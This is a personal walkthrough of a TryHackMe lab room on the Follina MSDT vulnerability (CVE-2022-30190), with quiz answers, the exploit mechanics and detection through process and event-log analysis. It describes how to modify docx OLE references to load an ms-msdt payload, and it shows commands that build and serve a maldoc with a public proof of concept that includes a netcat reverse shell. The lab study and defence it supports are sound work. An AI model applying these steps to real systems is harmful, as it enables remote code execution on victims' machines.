<h1 align="center">Follina MSDT<br>
CVE-2022-30190 . Windows . RCE vulnerability in MSDT service</h1>
<p align="center">July 22, 2025<br>
<img width="80px" src="https://github.com/user-attachments/assets/d7780755-3513-4c21-8c48-3736e7cdbc2f"><br>
<em>A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the service vulnerability,<br>and consequent detection techniques and remediation processes</em>.  Access it <a href="https://tryhackme.com/room/follinamsdt">here</a>.<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>442</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/20feb5dc-cfd9-454f-b6b4-7b2d254dc1a7"></p>


<br>

<h2>Task 1 . Introduction</h2>
<p>Microsoft explains that “a remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights”</p>

<p align="center"><img width="600px" src="https://github.com/user-attachments/assets/a4e09d76-91bc-438e-a142-17ba937e113a"></p>



<h3>Learning Objectives</h3>
<p>In this room, we will explore what the Microsoft Support Diagnostic Tool is and the discovered vulnerability that it has. In the process, we will be able to experience exploiting this vulnerability and consequently learn some techniques to detect and mitigate its exploitation in our own environments.</p>

<h3>Room Prerequisites and Expectation Setting</h3>
<p>There are no hard prerequisites in order to gain value from this room, however it would be very helpful to have a basic understanding of various scripting tools e.g. Windows CLI, Linux Bash Terminal, and PowerShell. Further, this room will touch upon Windows Processes and Data Correlation in lieu of Threat Hunting, albeit nothing too deep nor too complex to be understood.</p>

<h3 align="left"> Answer the question below</h3>

<p>1.1. Hope you enjoy this room<br>
<code>No answer needed</code></p>

<br>

<h2>Task 2 . CVE-2022-30190</h2>
<p>The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to MSRC, the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable.<br>

It’s not until the discovery of nao_sec, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by Kevin Beaumont who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190</p>

<p>Summarized timeline of its discovery:

- August 1st 2020  — A bachelor thesis is published detailing how to use MSDT to execute code<br>
- March 10th 2021  — researchers report to Microsoft how to use Microsoft Office URIs to execute code using Microsoft Teams as an example. Microsoft fail to issue a CVE or inform customers, but stealth patched it in Microsoft Teams in August 2021. They did not patch MSDT in Windows or the vector in Microsoft Office (Link)<br>
- April 12th 2022  — first report to Microsoft MSRC of exploitation in wild via MSDT, by leader of Shadowchasing1, an APT hunting group. This document is an in the wild, real world exploit targeting Russia, themed as a Russian job interview<br>

<img width="1212" height="562" alt="image" src="https://github.com/user-attachments/assets/e2287b53-32cb-47c9-95b8-26962ea5462a" />

- April 21st 2022  — Microsoft MSRC closed the ticket saying not a security related issue (for the record, msdt executing with macros disabled is an issue)<br>

<img width="1400" height="354" alt="image" src="https://github.com/user-attachments/assets/c93c614a-7c7a-44cc-a796-9447c99fffbb" />

- May 27th 2022  — Security vendor Nao tweet a document uploaded from Belarus, which is also an in the wild attack.<br>
- May 29th 2022  — Kevin Beaumont identified this was a zero day publicly as it still works against Office 365 Semi Annual channel, and ‘on prem’ Office versions and EDR products are failing to detect<br>
- May 31st 2022  — Microsoft classify this a zero day in Microsoft Defender Vulnerability Management<br>

<img width="630" height="573" alt="image" src="https://github.com/user-attachments/assets/37507ad4-4c9e-4c94-9425-d64e22f5e4d3" />

- June 14th 2022  — a fix for this vulnerability, CVE-2022–30190, is available in June 2022’s Patch Tuesday</p>

<p>Further readings::<br>

- Follina — a Microsoft Office code execution vulnerability | by Kevin Beaumont | May, 2022 | DoublePulsar<br>
- Full timeline, early details regarding the vulnerability, and “Follina” namesake courtesy of Kevin Beaumont<br>
- Rapid Response: Microsoft Office RCE - “Follina” MSDT Attack (huntress.com)
</p>

<h3 align="left"> Answer the questions below</h3>

<p>2.1. What year was MSDT first discovered to be vulnerable to code execution?<br>
<code>2020</code></p>

<br>

<p>2.2. Who is the author of the bachelor's thesis which first detailed this vulnerability?<br>
<code>Benjamin Altpeter</code></p>

<br>

<p>2.3.What is the name of the APT hunting group who first reported evidence of exploitation in the wild of MSDT to MSRC? <br>
<code>Shadowchasing1</code></p>


<br>

<h2>Task 3 . The MSDT Service</h2>
<p>Microsoft states that “the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support. They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer”<br>
<br>

Think of it like this - you’re having car problems and you don’t know about cars at all. You call your trusty car mechanic, but instead of him asking you to check different parts of the car while he tries to deduce what’s wrong with it remotely, he just gives you a passkey, instructs you how to use it and the car will magically produce a report that you can then send to the mechanic. Quick, easy, and efficient.<br>

Further reading: Windows 10 CTP: How To Run Microsoft Support Diagnostic Tool - TechNet Articles - United States (English) - TechNet Wiki</p>

<h3 align="left"> Answer the question below</h3>

<p>3.1. What's one thing you need that the support will provide you when you're using the MSDT legitimately?<br>
<code>passkey</code></p>

<br>

<h2>Task 4 . Exploiting Follina Windows Vulnerability</h2>
<p>Click the Start Machine button on this task before continuing. The machine will be available on your web browser, in split-screen view. 

Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.<br>

The process explorer from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.</p>

<h3>Exploit Expalaination</h3>
<p>Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been discovered in the wild. However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.<br>

Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.<br>

Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.<br>

More specifically, drilling into the docx structure, the word/_rels/document.xml.rels file has an XML tag <Relationship> with an attribute Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the Target value into http://<external_payload_server.com>/<payload.html> and the TargetMode value into "External".<br>

In the word/document.xml file, there's an XML tag that starts with <o:OLEObject...> wherein we should change the Type value to "Link" and then add the Key-Value pair attribute UpdateMode="OnCall".<br>

The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:</p>

<img width="913" height="105" alt="image" src="https://github.com/user-attachments/assets/b06a66c5-51ba-4c61-9789-5f93ae2fdfa9" />

<p>In the above contents of the html file, you'd notice the ms-msdt:/id PCWDiagnostic /skip force /param command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.<br>

As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.</p>

<h3>Publicly Available Exploit Focus: </h3>

<p>JohnHammond/msdt-follina: JohnHammond/msdt-follina</p>
<p>John Hammond has created a tool to automate the process of creating a malicious document (maldoc) and consequently host the malicious html file that houses the bad command. The tool is documented in the link above, and we will be using a forked version of it to further understand the concept of the exploit touched upon earlier.<br>

To start with our experiment, open a terminal instance in your Attackbox and enter the following command:</p>


<p><em>msdt-follina</em></p>

```bash
root@attackbox:~# cd ~/Rooms/Follina-MSDT
```

<p>We change our working directory to ~/Rooms/Follina-MSDT, where the msdt-follina repository has been cloned for you.</p>

<p><em>Launch the exploit</em></p>

```bash
root@attackbox:~/Rooms/Follina-MSDT# python3.9 follina.py -i ens5
[+] copied staging doc /tmp/[random string]
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

<p>Upon firing up the exploit, you should be hosting the file already, so it’s ready to be “delivered” to the victim machine. Effective delivery mechanisms of malicious payloads are outside the scope of this room, so we’ll just settle for a simpler way of transferring files from linux to windows:<br>

 

While keeping the original terminal open, open another terminal in your Attackbox and enter the following command:</p>

<p><em>Simple HTTP Server</em></p>

```bash
root@attackbox:~# cd ~/Rooms/Follina-MSDT 

root@attackbox:~/Rooms/Follina-MSDT# python3 -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
```

<p>Start the Windows machine and wait for it to initialize. When everything's settled, proceed to open a command prompt and enter the following command:</p>

<p><em>Maldoc Download</em></p>

```bash
Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd Desktop
C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx
```

<p>This downloads the maldoc in our machine and as such, shortly after, you should be able to see the word file named follina.docx appear in the Desktop, ready to be run. When you're ready, open the file and watch what happens.<br>

 

For now, let's allow the maldoc and all of the stuff that it spawned, to remain running, while we examine the contents of the process explorer.</p>

<h3>Process Explorer</h3>
<p>Looking at the process explorer may be daunting as there are a ton of processes always running within the machine. In our case, we haven't done a lot of stuff with it and yet the number of running processes already covers the entire screen. This is where the importance of "making sense of the baseline", discussed in the first part of this task, is emphasized.<br>

If you don't have any established baseline, it's easy to get paranoid and everything will suddenly seem to be suspicious. This is where you start wasting your time checking each and every process there is - mainly because you're unfamiliar with each and every one of them.<br>

Scrolling through the processes, you'll be able to spot WINWORD.EXE immediately, followed by an msdt.exe child process. Somewhere in the list of processes you'll be able to see a process for the calculator as well which is the win32calc.exe. It might look something like this, although it's completely normal if the WINDWORD.EXE and the win32calc.exe are far away from each other.</p>

<img width="683" height="53" alt="image" src="https://github.com/user-attachments/assets/49dea496-e3d0-48b3-8c6e-81b463ae50c8" />

<p>Now, finding these artifacts are easy because we already know what to look for, but how do we tackle the ones that we don't know about, the so called unknown unknowns? Well, we can refer to the baseline that we have, we compare, and then we validate.</p>

<h3>"Zero Click" Implementation</h3>
<p>In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file, add a cute message (completely optional),  save it in the Rich Text Format (RTF), and we’re good to go. This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.<br>

Open the file explorer and navigate to the Desktop folder. There you will see the seemingly honest file that we made that needs clicking, proceed to click it once careful not to actually open it and see what will happen.<br>

Despite not actually opening the file, the exploit ran in the same manner that it did earlier in this exercise. This happened because of two key features: 1) the feature of the File Explorer to preview files before opening them, and 2) the RTF which allows the feature of document files being able to be previewed in the File Explorer before being opened (among other purposes).<br>

Combining the two and then abusing them will result in an attack vector that we’ve just witnessed now.</p>

<h3 align="left"> Answer the questions below</h3>

<p><em>Launched the Exploit</em> and <em>Started an HTTP Server</em></p>

<img width="865" height="296" alt="image" src="https://github.com/user-attachments/assets/2d4785f0-2f83-40a8-b527-bc310ed9c4f6" />

<p><em>Started the Windows VM</em>, <em>Waited fot it to Initialize</em> and <em>Opened Command Prompt</em>/p>

<img width="795" height="77" alt="image" src="https://github.com/user-attachments/assets/5123a082-174c-46e5-b983-585defe8f9cb" />

<p><em>Downloaded the Maldoc</em></p>

<img width="1062" height="203" alt="image" src="https://github.com/user-attachments/assets/b2458c64-4c5b-477c-9ce5-4bc4fcf20a94" />

<p><em>Double-clicked over the <code>follina</code> file</em></p>

<img width="1110" height="331" alt="image" src="https://github.com/user-attachments/assets/61893017-dccd-4acc-b5ef-8f1a97863879" />

<br>

<p>4.1. What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe"<br>
<code>win32calc.exe</code></p>

<img width="683" height="53" alt="image" src="https://github.com/user-attachments/assets/49dea496-e3d0-48b3-8c6e-81b463ae50c8" />

<br>
<br>

<p>4.2. What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it.

Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from. <em> Hint : External Research Required<br>
<code>05-2022-0438.doc</code></p>

<br>
<br>

<p>4.3. The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this? <em>Check the follina.py file</em><br>
<code>netcat</code></p>

<img width="1221" height="88" alt="image" src="https://github.com/user-attachments/assets/1add9e8b-5922-439c-b217-f23f56207c61" />


<br>
<br>

<p>4.4. Where is this binary being downloaded?<br>
<code>C:\Windows\Tasks</code></p>


<img width="1259" height="162" alt="image" src="https://github.com/user-attachments/assets/4780ea8f-8444-4f6f-9982-277589af60b0" />

<br>
<br>

<p>4.5. In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one?<br>
<code>sdiagnhost.exe</code></p>

<p><em>Launched </em>Sysinternals Process Explorer</em></p>

<img width="1077" height="341" alt="image" src="https://github.com/user-attachments/assets/e619db97-398a-43f0-acfd-c7a5412c3a7b" />

<br>
<br>

<p>4.6. What is the child process of WINWORD.EXE?<br>
<code>msdt.exe</code></p>

<img width="1076" height="450" alt="image" src="https://github.com/user-attachments/assets/e8e58f97-2111-4e5f-90ce-328bee22cbc2" />

<br>
<br>

<p>4.7. What is the child process of the other interesting parent process?<br>
<code>conhost.exe</code></p>

<img width="1076" height="236" alt="image" src="https://github.com/user-attachments/assets/4baa7860-280f-4c12-a41d-9a641e5d5f2f" />

<br>
<br>

<p>4.8. What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used?<br>
<code>prevhost.exe</code></p>

<img width="770" height="231" alt="image" src="https://github.com/user-attachments/assets/ef2b62ca-18c5-4e69-b521-8edbc9e1da11" />

<br>
<br>

<h2>Task 5 . Detection</h2>
<h3>Threat hunting</h3>
<p>﻿The Windows machine that we’ve used to study the exploitation of the vulnerability has been pre-configured to have logging enabled for:<br>

- Audit Process Creation<br<
- Command Line Process Auditing, and<br>
- Script Block Logging</p>

<p>These auditing mechanisms are not configured by default and as such, it is imperative that these are turned on in your own environments to aid in the detection of suspicious behavior, and to help keep valuable data available for forensic examiners.<br>

During the previous task, we've identified a number of interesting process creations upon the exploitation of the vulnerability. These process creations are logged in Windows Security Logs, ready to be analyzed via your favorite viewer, or forwarded to a centralized log collector to be processed then further used later on.<br>

For this task we'll be using Event Log Viewer for Windows by Nirsoft to check out the process creations we've identified earlier. We will then look for details within these process creations that we can use to look for clues in other event logs to explain better what happened behind the scenes. The Event Log Viewer has been pinned in the Taskbar for you.<br>

Proceed to open FullEventLogView pinned in your taskbar. Go to View > Use Quick Filter. A search bar should appear on top of the logs which would allow us to do quick searches. Since we wanted to check the details of our process creations, we can click on the left-most drop down menu and choose Find Event ID (space/comma...), then type 4688 to the search bar provided as shown below:</p>

<img width="793" height="130" alt="image" src="https://github.com/user-attachments/assets/6f7ba793-590d-4740-bb3f-8ac6f3576810" />

<p>The screen should populate with Process Creation events and you'll notice immediately  that there's a ton of them, despite having minimal interaction with the machine.</p>

<img width="354" height="143" alt="image" src="https://github.com/user-attachments/assets/faefcd09-30d6-4bd7-ab3c-906875a0ebf3" />

<p>The first artifact we'll check is winword.exe - understanding the flow of events from this process gives us an idea how an office process in general, will behave in the context of an msdt exploitation. Hit Ctrl+F to spawn a Find function and type in winword.<br>

The first entry that you'll probably see is the one where WINWORD.EXE is the new process being created, identified by the detail: New Process Name. This process marks the opening of the follina.docx file, via by the detail: Process Command Line. It should look like the one below, though it's completely normal for it not to look exactly the same.</p>

<img width="1190" height="116" alt="image" src="https://github.com/user-attachments/assets/bc50e7d1-e8b3-43f6-91da-8fafa6f29cdc" />

<p>Click the Find Next button until you find an entry that looks something like this:</p>

<img width="1831" height="134" alt="image" src="https://github.com/user-attachments/assets/162f4954-1dac-44c9-af97-fa4a6800b360" />

<p>Here we'll see that the WINWORD.EXE is the Creator Process, more commonly known as the Parent Process of msdt.exe. Notice the long command line entry that contains multiple PowerShell cmdlets (pronounced command-lets) as well as multiple directory traversals. Seeing this, on its own, in your environment should raise immediate red flags. One free nugget that we can look closely here is the string Y2FsYw== that when decoded would result in the string calc.<br>

Since we saw PowerShell cmdlets, it would make sense for us to filter out PowerShell events to further check this lead. Since there's a lot of unique event IDs that log PowerShell events, we can filter via Provider. Go to Options > Advanced Options. Click the second dropdown menu and select Show only the specific providers (comma-delimited...). Type PowerShell enclosed with wildcards (*) so all providers with regards to PowerShell will be included.</p>

<img width="631" height="456" alt="image" src="https://github.com/user-attachments/assets/3cedfe7d-9684-43e8-b712-6a7bcc32da85" />


<p>Clear the "Quick Filter" box of the 4688 we entered earlier, and the screen should populate with events that exclusively come from PowerShell providers. From here, we can filter the events via part of the PowerShell command we've noted above.</p>


<img width="1672" height="259" alt="image" src="https://github.com/user-attachments/assets/e05cce80-2514-4540-a861-def359769817" />

<p>Upon arriving in this event, we can close the find function and then proceed to follow the trail of this Scriptblock text; you can navigate to the next event by pressing the down key in your keyboard, or manually clicking the event. Exploring the immediate events that follow this scriptblock text will show the step-by-step execution of calc in the perspective of PowerShell.<br>

There's still a lot to be explored in the above scriptblock alone but for the sake of brevity, it will be left to the student to explore further and see what else they can uncover. Questions at the end of this task may serve as guide as well.</p>

<h3>Sigma rule availability</h3>

<p>Huntress Detection Engineer Matthew Brennan has created a sigma rule to detect suspicious MSDT executions in the environment and the best thing about it is that it keeps getting updated whenever the community spots something new.<br>

The sigma rule can be found here.<br>


Uncoder.IO is a nice tool that helps convert sigma rules to queries that can be immediately used within a SIEM of your choice.<br>

In hunting for MSDT exploits around the environment, you may opt to use the sigma rule as a detection mechanism for both:<br>

- Analytics for use in near real time detections of exploits, and<br>
- Retroactive checks of prior intrusions<br><br>

MSDT also uses another binary to channel executions and so, suspicious child processes with it as the parent should be noted and further investigated. The "redacted" information above is an answer to a question in the previous task - check at your own spoilage.<br><br>

Further reading:<br>

- Detecting Follina: Microsoft Office remote code execution zero-day</p>


<h3 align="left"> Answer the questions below</h3>

<br>
<p>5.1. What encoding is used in the string Y2FsYw==<br>
<code>base64</code></p>

<br>

<p>5.2. What is the parent process of calc.exe?<br>
<code>sdiagnhost.exe</code></p>

<br>

<p>5.3. iagnostic package index information is loaded from what file path?<br>
<code>C:\Windows\Diagnostics\Index</code></p>

<br>

<h2>Task 6 . Remediation</h2>
<p>[ ... ]</p>

<h3 align="left"> Answer the question below</h3>

<br>
<p>6.1. What error message did the document give upon opening? That error that you've just noticed, had you not known that we're doing an experiment here, is called an Indicator of Attack. You must be very cautious of these kinds of error messages in your own environments.<br>
<code>You'll need a new app to open this ms-msdt</code></p>

<img width="1314" height="277" alt="image" src="https://github.com/user-attachments/assets/eff9d242-e83f-40d0-9b69-daa85333fd49" />


<img width="1515" height="337" alt="image" src="https://github.com/user-attachments/assets/49d50320-4646-463d-abef-d003e3406347" />

<br>


<h2>Task 7 . Room Recap + Recent Developments</h2>
<p>This room explored the MSDT Service and its vulnerability history. It touched upon the idea that features, no matter the intended purpose, will be abused sooner or later. There is no shortage of creativity in this industry, and every so often, exploitation of vulnerabilities such as this is being discovered in the wild.<br>

This room has also emphasized the importance of establishing a proper baseline and consequently explored threat hunting techniques that are transferrable in most environments through the use of simple tools that can easily be downloaded and deployed. This is closely followed by a threat hunting challenge that can be solved by following said techniques.<br>

Finally, a couple of remediation processes that are both straightforward and easily deployable has been the chosen method of closing this topic.<br>

As of room publishing, Microsoft has already released a patch that blocks PowerShell injection, effectively disabling that attack vector.<br>

This room will be updated from time to time.</p>

<h3 align="left"> Answer the question below</h3>

<br>
<p>7.1. See you again soon, and happy hunting!<br>
<code>No answer needed</code></p>

<br>
<br>

<img width="1892" height="879" alt="image" src="https://github.com/user-attachments/assets/e6ecc369-02a3-4d16-bbac-099d758b7172" />

<img width="1888" height="901" alt="image" src="https://github.com/user-attachments/assets/3de9c2cb-d062-4302-929a-6ae3c4f9434b" />

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 20, 2025     | 442      |     152ⁿᵈ    |      5ᵗʰ     |    192ⁿᵈ    |     8ᵗʰ    | 116,187  |    872    |    72     |

</div>

<p align="center"><img width="300px" src="https://github.com/user-attachments/assets/a2cd97d0-ef8a-4122-9b5a-9087230a2077"></p>

<img width="1894" height="904" alt="image" src="https://github.com/user-attachments/assets/5d7abcb1-f7ad-4651-95b6-47422d2ff884" />

<img width="1895" height="890" alt="image" src="https://github.com/user-attachments/assets/20440467-186f-4530-9d12-59e3468242b6" />

<img width="1908" height="894" alt="image" src="https://github.com/user-attachments/assets/1ebb4ae1-24a9-43c2-9d5c-33d96e2e1dfa" />

<img width="1903" height="896" alt="image" src="https://github.com/user-attachments/assets/068f410b-8ea2-4e09-b799-1147d132b42f" />
